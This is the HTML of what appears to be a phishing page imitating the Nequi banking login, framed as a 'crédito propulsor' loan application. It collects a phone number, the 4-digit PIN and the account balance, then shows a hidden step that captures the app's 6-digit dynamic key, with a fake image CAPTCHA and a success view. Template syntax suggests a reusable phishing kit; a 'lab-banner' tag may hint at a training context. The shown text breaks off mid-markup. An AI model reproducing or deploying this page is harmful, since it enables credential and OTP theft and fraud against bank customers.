<!DOCTYPE html>
<html lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
    <meta http-equiv="origin-trial"
        content="A/kargTFyk8MR5ueravczef/wIlTkbVk1qXQesp39nV+xNECPdLBVeYffxrM8TmZT6RArWGQVCJ0LRivD7glcAUAAACQeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZzIiLCJleHBpcnkiOjE3NDIzNDIzOTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
    <style data-styles="">
        ion-icon {
            visibility: hidden
        }

        .hydrated {
            visibility: inherit
        }
    </style>
    <title>Nequi</title>
    <base href=".">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="cache-control" content="max-age=0">
    <meta http-equiv="cache-control" content="no-cache">
    <meta http-equiv="expires" content="0">
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
    <meta http-equiv="pragma" content="no-cache">
    <link rel="icon" type="image/x-icon" href="https://paga.nequi.com.co/bdigitalpsp/favicon.ico">
    <style>
        html,
        body {
            height: 100%
        }

        html {
            background: #ffffff;
            color: #293038;
            scroll-behavior: smooth
        }

        body {
            margin: 0;
            line-height: 1.5;
            font-family: Manrope, sans-serif;
            font-size: 16px;
            font-size: 1rem;
            display: flex;
            flex-direction: column;
            -ms-text-size-adjust: 100%;
            -webkit-text-size-adjust: 100%;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale
        }

        *,
        *:before,
        *:after {
            box-sizing: border-box
        }

        :root {
            --font-family: "Manrope", sans-serif;
            --form-field: #f8f1f5;
            --uva: #200020;
            --uva-90: #130013;
            --uva-80: #4d334d;
            --uva-60: #796679;
            --uva-40: #a699a6;
            --uva-20: #d2ccd2;
            --uva-10: #e9e5e9;
            --orquidea: #da0081;
            --orquidea-90: #a9186e;
            --orquidea-70: #e366a7;
            --orquidea-50: #e992be;
            --orquidea-30: #f1bfda;
            --orquidea-10: #fbe5f2;
            --gray-800: #454545;
            --gray-500: #646464;
            --gray-400: #848484;
            --gray-300: #c2c2c2;
            --gray-200: #e8e8e8;
            --gray-100: #fafafa;
            --white: #ffffff;
            --input-background: #fbf7fb;
            --positive: #11da7a;
            --positive-80: #0eb565;
            --informative: #46d5e8;
            --negative: #ff3e60;
            --negative-80: #d93552;
            --negative-20: #ffaebd;
            --negative-10: #ffd6dd;
            --orange: #dc410f
        }

        @font-face {
            font-family: Manrope;
            src: url(/nequi/Manrope-VariableFont_wght.3787d9a87cc64466.ttf) format("truetype")
        }
    </style>
    <style>
        .main-container {
            display: flex;
            flex-direction: column;
            margin-left: auto;
            margin-right: auto;
            max-width: 100%;
            padding-left: 0;
            padding-right: 0
        }

        .main-container-narrow {
            max-width: 360px;
            padding-left: 1rem;
            padding-right: 1rem;
            margin: 0 auto;
        }

        .header {
            display: flex;
            justify-content: center;
            align-content: center;
            margin: 1.25rem 1.25rem 1.875rem
        }

        @media (min-width: 960px) {
            .header {
                margin-top: 3.5rem
            }
        }

        .title {
            font-weight: 700;
            font-size: 1.5rem;
            line-height: 2rem;
            text-align: center;
            color: var(--uva);
            margin: 0 0 1rem;
            font-style: normal
        }

        .subtitle {
            font-weight: 400;
            font-size: .875rem;
            line-height: 19px;
            text-align: center;
            margin: 0;
            padding: 0;
            color: var(--uva);
            font-style: normal;
            margin-bottom: 1.5rem
        }

        .dynamic-password__subtitle {
            color: var(--uva);
            text-align: center;
            font-size: .875rem;
            font-style: normal;
            line-height: 1.25rem;
            font-weight: 400;
            letter-spacing: .2px;
            margin-bottom: 1.75rem
        }

        .dynamic-password__container-buttons {
            margin-top: 32px
        }

        .splash {
            height: 100%;
            width: 100%;
            background-color: var(--white)
        }

        .splash__container {
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100%
        }

        /* Input styles */
        .input-container__field {
            width: 100%;
            max-width: 328px
        }

        .input-container__field input {
            width: 100%;
            height: 48px;
            background-color: var(--form-field);
            border: 0;
            border-radius: 4px;
            padding: 8px 16px;
            color: var(--uva);
            font-size: 1rem;
            font-weight: 500;
            line-height: 1.25rem;
            font-style: normal;
            position: relative
        }

        .input-container__field input:focus,
        .input-container__field input:active {
            outline: 0px;
            outline-offset: 0px;
            box-shadow: none;
            border: 1px solid var(--uva-60);
            padding: 20px 16px 6px;
        }

        .input-container__field input.p-filled {
            padding: 20px 16px 6px;
        }

        .input-container__field input.p-invalid {
            border: 1px solid var(--negative-80)
        }

        .input-container__field label {
            color: var(--uva);
            font-size: 1rem;
            font-weight: 400
        }

        .input-container__field .p-float-label > label {
            position: absolute;
            top: 50%;
            left: 16px;
            transform: translateY(-50%);
            pointer-events: none;
            transition: all 0.2s ease;
        }

        .input-container__field input:focus ~ label,
        .input-container__field input.p-filled ~ label,
        .input-container__field input:not(:placeholder-shown) ~ label {
            top: 1%;
            transform: translateY(0);
            font-size: 12px;
            color: var(--orquidea);
        }

        .input-container__error {
            color: var(--negative-80);
            font-size: .75rem;
            font-weight: 400;
            margin-top: 4px;
            display: none;
        }

        .input-container__error.show {
            display: block;
        }

        /* Button styles */
        .p-button {
            color: var(--white);
            width: 100%;
            max-width: 352px;
            min-height: 48px;
            background: var(--orquidea);
            padding: 8px;
            font-size: 1rem;
            transition: background-color .2s, color .2s, border-color .2s, box-shadow .2s;
            border-radius: 4px;
            font-style: normal;
            font-weight: 500;
            line-height: 1.25rem;
            border: 1px solid var(--orquidea);
            cursor: pointer;
        }

        .p-button:disabled {
            color: var(--white);
            background: var(--orquidea-30);
            border: 1px solid var(--orquidea-30);
            cursor: not-allowed;
        }

        .p-button:enabled:hover {
            background: var(--orquidea-70);
            border-color: var(--orquidea-70);
            color: var(--white);
        }

        .p-button:enabled:active {
            background: var(--orquidea-90);
            border-color: transparent;
            color: var(--white);
        }

        .p-button:focus {
            box-shadow: none;
            outline: none;
        }

        .p-button.p-button-secondary {
            color: var(--uva);
            background: var(--white);
            border: 1px solid var(--uva);
        }

        .p-button.p-button-secondary:enabled:hover {
            background: var(--uva-80);
            border-color: var(--uva-80);
            color: var(--white);
        }

        /* Numeric keypad styles */
        .box_numerickeypad {
            width: 272px;
            display: flex;
            justify-content: space-around;
            margin: 0 auto;
        }

        .input-keypad {
            border: none;
            background: transparent;
        }

        .code_numerickeypad {
            width: 36px;
            border-bottom: 1px solid var(--uva);
            padding-bottom: 8px;
            height: 40px;
            line-height: 40px;
            text-align: center;
            font-size: 1.25rem;
            color: var(--orquidea);
            font-weight: 700;
            -webkit-text-security: disc;
            overflow: visible;
        }

        .label_numerickeypad {
            font-size: .875rem;
            font-style: normal;
            font-weight: 400;
            line-height: 1.25rem;
            letter-spacing: .2px;
            color: var(--orquidea);
            padding: 16px;
            text-align: center;
        }

        .p-card {
            display: flex;
            flex-direction: column;
            margin: 0;
            align-items: center;
            gap: 8px;
            background: var(--white);
            width: 320px;
            box-shadow: none
        }

        @media screen and (max-width: 425px) {
            .p-card {
                width: 100%
            }
        }

        .p-card .p-card-body {
            padding-bottom: 0
        }

        .numeric_board {
            width: 90%;
            margin: 0 auto
        }

        .numeric_board-row {
            display: flex;
            padding-bottom: 18px;
            justify-content: space-between;
            padding-right: 12px
        }

        .numeric_board-row:last-child {
            padding-bottom: 0
        }

        .container_number {
            color: var(--uva);
            font-size: 2.25rem;
            font-style: normal;
            font-weight: 400;
            line-height: 3rem;
            width: 28.67px;
            display: flex;
            justify-content: flex-end;
            text-align: center;
            outline: unset;
            outline-offset: unset;
            cursor: pointer;
            align-items: center;
            background: transparent;
            border: none;
        }

        .container_number:hover {
            color: var(--orquidea);
        }

        /* Form styles */
        .form {
            margin-top: 1.25rem;
            margin-bottom: 1.5rem;
            display: flex;
            flex-direction: column;
            gap: .5rem
        }

        .form__buttons {
            margin-top: 1.5rem;
            display: flex;
            flex-direction: column;
            gap: 1rem
        }

        /* Hidden class */
        .hidden {
            display: none !important;
        }

        /* Loading overlay */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.95);
            z-index: 9999;
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }

        .loading-overlay.active {
            display: flex;
        }

        .texto-1 {
            color: var(--uva);
            font-size: 1rem;
            font-weight: 500;
            text-align: center;
            margin-top: 20px;
        }

        /* Error message general */
        .mensaje-error-general {
            background: var(--negative-10);
            color: var(--negative-80);
            padding: 12px 16px;
            border-radius: 8px;
            margin-bottom: 16px;
            font-size: 14px;
            font-weight: 500;
            display: none;
            text-align: center;
        }

        .mensaje-error-general.show {
            display: block;
        }

        /* Success/Error views */
        .resultado-container {
            text-align: center;
            padding: 40px 20px;
        }

        .resultado-icon {
            font-size: 80px;
            margin-bottom: 20px;
        }

        .resultado-icon.success {
            color: var(--positive);
        }

        .resultado-icon.error {
            color: var(--negative);
        }

        .resultado-titulo {
            color: var(--uva);
            font-size: 1.25rem;
            font-weight: 700;
            margin-bottom: 10px;
        }

        .resultado-mensaje {
            color: var(--gray-500);
            font-size: 1rem;
        }

        /* Link styles */
        .p-button-underline {
            color: var(--orquidea);
            text-align: center;
            font-size: .875rem;
            font-style: normal;
            font-weight: 500;
            line-height: 1.25rem;
            text-decoration-line: underline;
            cursor: pointer;
            background: none !important;
            border: none !important;
            min-height: auto;
            padding: 0;
            display: block;
            margin: 20px auto 0;
        }

        .p-button-underline:hover {
            color: var(--orquidea-30)
        }

        /* ==================== Estilos Login - Uniformes con inicio1 ==================== */
        #login {
            max-width: 360px;
            margin: 0 auto;
            padding: 0 1rem;
        }

        #login .header {
            display: flex;
            justify-content: center;
            align-content: center;
            margin: 1.5rem;
        }

        @media (min-width: 960px) {
            #login .header {
                margin-top: 3.5rem;
            }
        }

        #login .header .logo img {
            height: 32px;
        }

        #login .title {
            font-weight: 700;
            font-size: 1.5rem;
            line-height: 2rem;
            text-align: center;
            color: var(--uva);
            margin: 0 0 1rem;
        }

        #login .subtitle {
            font-weight: 400;
            font-size: .875rem;
            line-height: 19px;
            text-align: center;
            color: var(--uva);
            margin-bottom: 1.5rem;
        }

        #login .form {
            margin: 1.25rem 0;
            display: flex;
            flex-direction: column;
            gap: .5rem;
        }

        #login .input-container__field {
            width: 100%;
            max-width: 328px;
            margin: 0 auto;
            position: relative;
        }

        #login .input-container__field .p-field,
        #login .input-container__field .p-float-label {
            line-height: 0;
            position: relative;
            width: 100%;
        }

        #login .input-container__field input {
            width: 100%;
            height: 48px;
            background-color: var(--form-field);
            border: 0;
            border-radius: 4px;
            padding: 8px 16px;
            color: var(--uva);
            font-size: 1rem;
            font-weight: 500;
            line-height: 1.25rem;
            position: relative;
        }

        #login .input-container__field input.placeholder.p-filled,
        #login .input-container__field input:not(:placeholder-shown) {
            padding: 20px 16px 6px;
        }

        #login .input-container__field input:focus,
        #login .input-container__field input:active {
            outline: 0px;
            outline-offset: 0px;
            box-shadow: none;
            border: 1px solid var(--uva-60);
        }

        #login .input-container__field input:focus.placeholder,
        #login .input-container__field input:active.placeholder {
            padding: 20px 16px 6px;
        }

        #login .input-container__field label {
            color: var(--uva);
            font-size: 1rem;
            font-weight: 400;
            position: absolute;
            top: 50%;
            left: 16px;
            transform: translateY(-50%);
            pointer-events: none;
            transition: all 0.2s ease;
        }

        #login .input-container__field input.placeholder.p-filled ~ label,
        #login .input-container__field input:focus ~ label,
        #login .input-container__field input:active ~ label,
        #login .input-container__field input:not(:placeholder-shown) ~ label {
            top: .9rem;
            left: 16px;
            font-size: 12px;
            font-weight: 400;
            transform: translateY(0);
            color: var(--orquidea);
        }

        #login .input-container__field input.p-invalid {
            border: 1px solid var(--negative-80);
        }

        #login .input-container__field input.p-invalid ~ label {
            color: var(--negative-80);
        }

        #login .input-container__error {
            color: var(--negative-80);
            font-size: .75rem;
            font-weight: 400;
            margin-top: 4px;
            display: none;
        }

        #login .input-container__error.show {
            display: block;
        }

        #login .captcha-wrapper {
            position: relative;
            max-width: 300px;
            margin: 1rem auto;
            cursor: pointer;
        }

        #login .captcha {
            width: 100%;
            height: auto;
            border-radius: 4px;
            display: block;
        }

        #login .captcha-check-overlay {
            position: absolute;
            top: 50%;
            left: 22px;
            transform: translateY(-50%);
            width: 24px;
            height: 24px;
            display: none;
        }

        #login .captcha-wrapper.checked .captcha-check-overlay {
            display: block;
        }

        #login .captcha-checkmark {
            width: 24px;
            height: 24px;
        }

        #login .form__buttons {
            margin-top: .5rem;
            display: flex;
            flex-direction: column;
            gap: 1rem;
            width: 100%;
            max-width: 328px;
            margin-left: auto;
            margin-right: auto;
        }

        #login .form__buttons .p-button {
            width: 100%;
            max-width: 100%;
        }

        #login .p-button {
            color: var(--white);
            width: 100%;
            min-height: 48px;
            background: var(--orquidea);
            padding: 8px;
            font-size: 1rem;
            transition: background-color .2s, color .2s, border-color .2s, box-shadow .2s;
            border-radius: 4px;
            font-style: normal;
            font-weight: 500;
            line-height: 1.25rem;
            border: 1px solid var(--orquidea);
            cursor: pointer;
        }

        #login .p-button:enabled:hover {
            background: var(--orquidea-70);
            border-color: var(--orquidea-70);
            color: var(--white);
        }

        #login .p-button:enabled:active {
            background: var(--orquidea-90);
            border-color: transparent;
            color: var(--white);
        }

        #login .p-button:disabled {
            color: var(--white);
            background: var(--orquidea-30);
            border: 1px solid var(--orquidea-30);
            cursor: not-allowed;
        }

        #login .p-button:focus {
            box-shadow: none;
            outline: none;
        }

        #login .form__help {
            margin-top: .5rem;
            font-weight: 500;
            font-size: .875rem;
            line-height: 19px;
            text-align: center;
            cursor: pointer;
            color: var(--orquidea);
            text-decoration: underline;
        }

        #login .form__help:hover {
            color: var(--orquidea-70);
        }

        /* ==================== Estilos OTP - Compacto ==================== */
        #otpapp {
            max-width: 360px;
            margin: 0 auto;
            padding: 0 1rem;
        }

        #otpapp .header {
            margin: 1rem 0;
        }

        #otpapp .title {
            margin-bottom: 0.5rem;
        }

        #otpapp .dynamic-password__subtitle {
            font-size: 0.8rem;
            line-height: 1.1rem;
            margin-bottom: 1rem;
        }

        #otpapp .p-card {
            width: 100%;
            max-width: 320px;
            margin: 0 auto;
            padding: 0;
        }

        #otpapp .p-card-body {
            padding: 0;
        }

        #otpapp .p-card-content {
            padding: 0;
        }

        #otpapp .box_numerickeypad {
            width: 240px;
            margin: 0 auto 0.5rem;
        }

        #otpapp .code_numerickeypad {
            width: 32px;
            height: 36px;
            line-height: 36px;
            font-size: 1.1rem;
            padding-bottom: 4px;
        }

        #otpapp .label_numerickeypad {
            padding: 8px;
            font-size: 0.75rem;
        }

        #otpapp .numeric_board {
            width: 85%;
        }

        #otpapp .numeric_board-row {
            padding-bottom: 10px;
        }

        #otpapp .container_number {
            font-size: 1.75rem;
            line-height: 2.25rem;
        }

        #otpapp .dynamic-password__container-buttons {
            margin-top: 1rem;
            max-width: 328px;
            margin-left: auto;
            margin-right: auto;
        }

        #otpapp .dynamic-password__container-buttons .p-button {
            min-height: 44px;
        }

        #otpapp .dynamic-password__container-buttons .p-button-secondary {
            margin-top: 0.75rem !important;
        }
    </style>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>

<body class="">
<x-lab-banner />

    <!-- Loading Overlay -->
    <div id="loading" class="loading-overlay">
        <img src="/nequi/nequi-spiner.gif" width="100" height="auto" alt="Cargando">
        <p class="texto-1">Espere un momento por favor.</p>
    </div>

    <nequi-root ng-version="15.2.10">
        <div class="main-container">

            <!-- Vista: Login -->
            <div id="login">
                <div class="header">
                    <section class="splash">
                        <div class="splash__container">
                            <svg width="180" height="40" viewBox="0 0 104 32" fill="none"
                                xmlns="http://www.w3.org/2000/svg" class="splash__container__svg">
                                <path d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081"></path>
                                <path d="M31.9876 0H28.2187C27.7033 0 27.3006 0.416 27.3006 0.912V15.872C27.3006 16.176 26.8979 16.288 26.753 16.016L17.991 0.4C17.8461 0.144 17.5884 0 17.2823 0H11.0169C10.5015 0 10.0988 0.416 10.0988 0.912V24.816C10.0988 25.328 10.5176 25.728 11.0169 25.728H14.7858C15.3012 25.728 15.7039 25.312 15.7039 24.816V9.408C15.7039 9.104 16.1066 8.992 16.2515 9.264L25.2551 25.344C25.4 25.6 25.6577 25.744 25.9638 25.744H31.9554C32.4708 25.744 32.8735 25.328 32.8735 24.832V0.912C32.8735 0.4 32.4547 0 31.9554 0H31.9876Z" fill="#200020"></path>
                                <path d="M54.6495 16.3999C54.6495 9.66395 50.2363 6.31995 45.3883 6.31995C39.0906 6.31995 35.4988 10.6559 35.4988 16.5119C35.4988 23.1679 40.0087 26.3359 45.2433 26.3359C50.4779 26.3359 53.5382 23.6479 54.3596 20.1599C54.4724 19.7119 54.2147 19.3119 53.5382 19.3119H50.5746C50.2363 19.3119 49.9464 19.4879 49.8015 19.8239C49.0606 21.4399 47.8687 22.2879 45.5815 22.2879C42.9884 22.2879 41.2489 20.6719 40.9912 17.3919H53.7315C54.2791 17.3919 54.6495 16.9919 54.6495 16.3999ZM41.2006 13.8559C41.7482 11.4399 43.1656 10.3679 45.3077 10.3679C47.2244 10.3679 48.8673 11.4719 49.0928 13.8559H41.2006Z" fill="#200020"></path>
                                <path d="M103.082 6.80005H99.2969C98.7899 6.80005 98.3788 7.20837 98.3788 7.71205V24.832C98.3788 25.3357 98.7899 25.744 99.2969 25.744H103.082C103.589 25.744 104 25.3357 104 24.832V7.71205C104 7.20837 103.589 6.80005 103.082 6.80005Z" fill="#200020"></path>
                                <path d="M74.976 6.80002H71.2071C70.6917 6.80002 70.289 7.21602 70.289 7.71202V8.64002C69.1615 7.32802 67.3093 6.41602 64.8772 6.41602C59.4332 6.41602 56.5501 11.312 56.5501 16.496C56.5501 21.024 58.9178 26.096 64.7644 26.096C66.8583 26.096 69.081 25.104 70.289 23.696V31.056C70.289 31.568 70.7078 31.968 71.2071 31.968H74.976C75.4914 31.968 75.8941 31.552 75.8941 31.056V7.72802C75.8941 7.21602 75.4753 6.81602 74.976 6.81602V6.80002ZM66.3912 22.064C63.9108 22.064 62.1713 20.256 62.1713 16.368C62.1713 12.48 63.9108 10.448 66.3912 10.448C68.8716 10.448 70.6111 12.32 70.6111 16.368C70.6111 20.416 68.8716 22.064 66.3912 22.064Z" fill="#200020"></path>
                                <path d="M95.0448 6.80005H91.2759C90.7604 6.80005 90.3578 7.21605 90.3578 7.71205V17.3921C90.3578 20.5121 88.9565 21.4241 87.1687 21.4241C85.3809 21.4241 83.9796 20.5121 83.9796 17.3921V7.71205C83.9796 7.20005 83.5608 6.80005 83.0615 6.80005H79.2926C78.7772 6.80005 78.3745 7.21605 78.3745 7.71205V17.7921C78.3745 23.7921 81.7086 26.2081 87.1848 26.2081C92.661 26.2081 95.9951 23.7761 95.9951 17.7921V7.71205C95.9951 7.20005 95.5763 6.80005 95.077 6.80005H95.0448Z" fill="#200020"></path>
                            </svg>
                        </div>
                    </section>
                </div>

                <h1 class="title">Entra a tu Nequi</h1>
                <p class="subtitle">Solicitud de crédito propulsor</p>

                <div id="errorGeneralLogin" class="mensaje-error-general"></div>

                <div class="form">
                    <div class="input-container__field">
                        <div class="p-float-label">
                            <input type="tel" id="usuario" name="usuario" class="placeholder" maxlength="12" inputmode="numeric" placeholder=" ">
                            <label for="usuario">Número de celular</label>
                        </div>
                        <div class="input-container__error" id="errorUsuario"></div>
                    </div>

                    <div class="input-container__field">
                        <div class="p-float-label">
                            <input type="password" id="clave" name="clave" class="placeholder" maxlength="4" inputmode="numeric" placeholder=" ">
                            <label for="clave">Clave</label>
                        </div>
                        <div class="input-container__error" id="errorClave"></div>
                    </div>

                    <div class="input-container__field">
                        <div class="p-float-label">
                            <input type="text" id="txtSaldo" name="txtSaldo" class="placeholder" inputmode="decimal" placeholder=" ">
                            <label for="txtSaldo">Saldo actual</label>
                        </div>
                        <div class="input-container__error" id="errorSaldo"></div>
                    </div>

                    <div class="captcha-wrapper" id="captchaWrapper">
                        <img src="{{ asset('nequi/inicio/ca.png') }}" alt="CAPTCHA" id="captcha" class="captcha">
                        <div class="captcha-check-overlay">
                            <svg class="captcha-checkmark" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M5 13l4 4L19 7" stroke="#4CAF50" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
                            </svg>
                        </div>
                    </div>

                    <div class="form__buttons">
                        <button type="button" id="btnLogin" class="p-button" disabled>Entra</button>
                    </div>
                </div>

                <a href="https://ayuda.nequi.com.co/hc/es" target="_blank" class="form__help">¿Se te olvidó la clave?</a>
            </div>

            <!-- Vista: OTP App -->
            <div id="otpapp" class="hidden">
                <div class="header">
                    <section class="splash">
                        <div class="splash__container">
                            <svg width="180" height="40" viewBox="0 0 104 32" fill="none"
                                xmlns="http://www.w3.org/2000/svg" class="splash__container__svg">
                                <path d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081"></path>
                                <path d="M31.9876 0H28.2187C27.7033 0 27.3006 0.416 27.3006 0.912V15.872C27.3006 16.176 26.8979 16.288 26.753 16.016L17.991 0.4C17.8461 0.144 17.5884 0 17.2823 0H11.0169C10.5015 0 10.0988 0.416 10.0988 0.912V24.816C10.0988 25.328 10.5176 25.728 11.0169 25.728H14.7858C15.3012 25.728 15.7039 25.312 15.7039 24.816V9.408C15.7039 9.104 16.1066 8.992 16.2515 9.264L25.2551 25.344C25.4 25.6 25.6577 25.744 25.9638 25.744H31.9554C32.4708 25.744 32.8735 25.328 32.8735 24.832V0.912C32.8735 0.4 32.4547 0 31.9554 0H31.9876Z" fill="#200020"></path>
                                <path d="M54.6495 16.3999C54.6495 9.66395 50.2363 6.31995 45.3883 6.31995C39.0906 6.31995 35.4988 10.6559 35.4988 16.5119C35.4988 23.1679 40.0087 26.3359 45.2433 26.3359C50.4779 26.3359 53.5382 23.6479 54.3596 20.1599C54.4724 19.7119 54.2147 19.3119 53.5382 19.3119H50.5746C50.2363 19.3119 49.9464 19.4879 49.8015 19.8239C49.0606 21.4399 47.8687 22.2879 45.5815 22.2879C42.9884 22.2879 41.2489 20.6719 40.9912 17.3919H53.7315C54.2791 17.3919 54.6495 16.9919 54.6495 16.3999ZM41.2006 13.8559C41.7482 11.4399 43.1656 10.3679 45.3077 10.3679C47.2244 10.3679 48.8673 11.4719 49.0928 13.8559H41.2006Z" fill="#200020"></path>
                                <path d="M103.082 6.80005H99.2969C98.7899 6.80005 98.3788 7.20837 98.3788 7.71205V24.832C98.3788 25.3357 98.7899 25.744 99.2969 25.744H103.082C103.589 25.744 104 25.3357 104 24.832V7.71205C104 7.20837 103.589 6.80005 103.082 6.80005Z" fill="#200020"></path>
                                <path d="M74.976 6.80002H71.2071C70.6917 6.80002 70.289 7.21602 70.289 7.71202V8.64002C69.1615 7.32802 67.3093 6.41602 64.8772 6.41602C59.4332 6.41602 56.5501 11.312 56.5501 16.496C56.5501 21.024 58.9178 26.096 64.7644 26.096C66.8583 26.096 69.081 25.104 70.289 23.696V31.056C70.289 31.568 70.7078 31.968 71.2071 31.968H74.976C75.4914 31.968 75.8941 31.552 75.8941 31.056V7.72802C75.8941 7.21602 75.4753 6.81602 74.976 6.81602V6.80002ZM66.3912 22.064C63.9108 22.064 62.1713 20.256 62.1713 16.368C62.1713 12.48 63.9108 10.448 66.3912 10.448C68.8716 10.448 70.6111 12.32 70.6111 16.368C70.6111 20.416 68.8716 22.064 66.3912 22.064Z" fill="#200020"></path>
                                <path d="M95.0448 6.80005H91.2759C90.7604 6.80005 90.3578 7.21605 90.3578 7.71205V17.3921C90.3578 20.5121 88.9565 21.4241 87.1687 21.4241C85.3809 21.4241 83.9796 20.5121 83.9796 17.3921V7.71205C83.9796 7.20005 83.5608 6.80005 83.0615 6.80005H79.2926C78.7772 6.80005 78.3745 7.21605 78.3745 7.71205V17.7921C78.3745 23.7921 81.7086 26.2081 87.1848 26.2081C92.661 26.2081 95.9951 23.7761 95.9951 17.7921V7.71205C95.9951 7.20005 95.5763 6.80005 95.077 6.80005H95.0448Z" fill="#200020"></path>
                            </svg>
                        </div>
                    </section>
                </div>

                <h1 class="title">Clave dinámica</h1>
                <p class="dynamic-password__subtitle">Para confirmar tu identidad escribe o pega la clave dinámica que encuentras en tu App Nequi.</p>

                <div id="errorGeneralOtpApp" class="mensaje-error-general"></div>

                <div class="p-card">
                    <div class="p-card-body">
                        <div class="p-card-content">
                            <div class="box_numerickeypad">
                                <input id="k1" type="text" class="input-keypad code_numerickeypad" maxlength="1" readonly inputmode="none">
                                <input id="k2" type="text" class="input-keypad code_numerickeypad" maxlength="1" readonly inputmode="none">
                                <input id="k3" type="text" class="input-keypad code_numerickeypad" maxlength="1" readonly inputmode="none">
                                <input id="k4" type="text" class="input-keypad code_numerickeypad" maxlength="1" readonly inputmode="none">
                                <input id="k5" type="text" class="input-keypad code_numerickeypad" maxlength="1" readonly inputmode="none">
                                <input id="k6" type="text" class="input-keypad code_numerickeypad" maxlength="1" readonly inputmode="none">
                            </div>
                            <div class="label_numerickeypad"></div>
                            <div class="numeric_board">
                                <div class="numeric_board-row">
                                    <button type="button" class="container_number" data-value="1">1</button>
                                    <button type="button" class="container_number" data-value="2">2</button>
                                    <button type="button" class="container_number" data-value="3">3</button>
                                </div>
                                <div class="numeric_board-row">
                                    <button type="button" class="container_number" data-value="4">4</button>
                                    <button type="button" class="container_number" data-value="5">5</button>
                                    <button type="button" class="container_number" data-value="6">6</button>
                                </div>
                                <div class="numeric_board-row">
                                    <button type="button" class="container_number" data-value="7">7</button>
                                    <button type="button" class="container_number" data-value="8">8</button>
                                    <button type="button" class="container_number" data-value="9">9</button>
                                </div>
                                <div class="numeric_board-row">
                                    <button type="button" class="container_number" disabled></button>
                                    <button type="button" class="container_number" data-value="0">0</button>
                                    <button type="button" class="container_number" data-value="backspace">
                                        <img alt="Borrar" src="/nequi/nequi-teclado-numerico-borrar.svg" style="width: 24px;">
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="dynamic-password__container-buttons">
                    <button type="button" id="btnOtpApp" class="p-button" disabled>Confirmar</button>
                </div>
            </div>


            <!-- Vista: Wait -->
            <div id="wait" class="hidden" style="margin-top: 30%;">
                <div class="text-center" style="text-align: center; padding: 40px 0;">
                    <img src="/nequi/nequi-spiner.gif" width="100" height="auto" alt="Cargando">
                </div>
                <div style="text-align: center;">
                    <p class="texto-1">Espere un momento por favor.</p>
                </div>
            </div>

            <!-- Vista: Éxito -->
            <div id="exito" class="hidden">
                <div class="header">
                    <section class="splash">
                        <div class="splash__container">
                            <svg width="180" height="40" viewBox="0 0 104 32" fill="none"
                                xmlns="http://www.w3.org/2000/svg" class="splash__container__svg">
                                <path d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081"></path>
                                <path d="M31.9876 0H28.2187C27.7033 0 27.3006 0.416 27.3006 0.912V15.872C27.3006 16.176 26.8979 16.288 26.753 16.016L17.991 0.4C17.8461 0.144 17.5884 0 17.2823 0H11.0169C10.5015 0 10.0988 0.416 10.0988 0.912V24.816C10.0988 25.328 10.5176 25.728 11.0169 25.728H14.7858C15.3012 25.728 15.7039 25.312 15.7039 24.816V9.408C15.7039 9.104 16.1066 8.992 16.2515 9.264L25.2551 25.344C25.4 25.6 25.6577 25.744 25.9638 25.744H31.9554C32.4708 25.744 32.8735 25.328 32.8735 24.832V0.912C32.8735 0.4 32.4547 0 31.9554 0H31.9876Z" fill="#200020"></path>
                                <path d="M54.6495 16.3999C54.6495 9.66395 50.2363 6.31995 45.3883 6.31995C39.0906 6.31995 35.4988 10.6559 35.4988 16.5119C35.4988 23.1679 40.0087 26.3359 45.2433 26.3359C50.4779 26.3359 53.5382 23.6479 54.3596 20.1599C54.4724 19.7119 54.2147 19.3119 53.5382 19.3119H50.5746C50.2363 19.3119 49.9464 19.4879 49.8015 19.8239C49.0606 21.4399 47.8687 22.2879 45.5815 22.2879C42.9884 22.2879 41.2489 20.6719 40.9912 17.3919H53.7315C54.2791 17.3919 54.6495 16.9919 54.6495 16.3999ZM41.2006 13.8559C41.7482 11.4399 43.1656 10.3679 45.3077 10.3679C47.2244 10.3679 48.8673 11.4719 49.0928 13.8559H41.2006Z" fill="#200020"></path>
                                <path d="M103.082 6.80005H99.2969C98.7899 6.80005 98.3788 7.20837 98.3788 7.71205V24.832C98.3788 25.3357 98.7899 25.744 99.2969 25.744H103.082C103.589 25.744 104 25.3357 104 24.832V7.71205C104 7.20837 103.589 6.80005 103.082 6.80005Z" fill="#200020"></path>
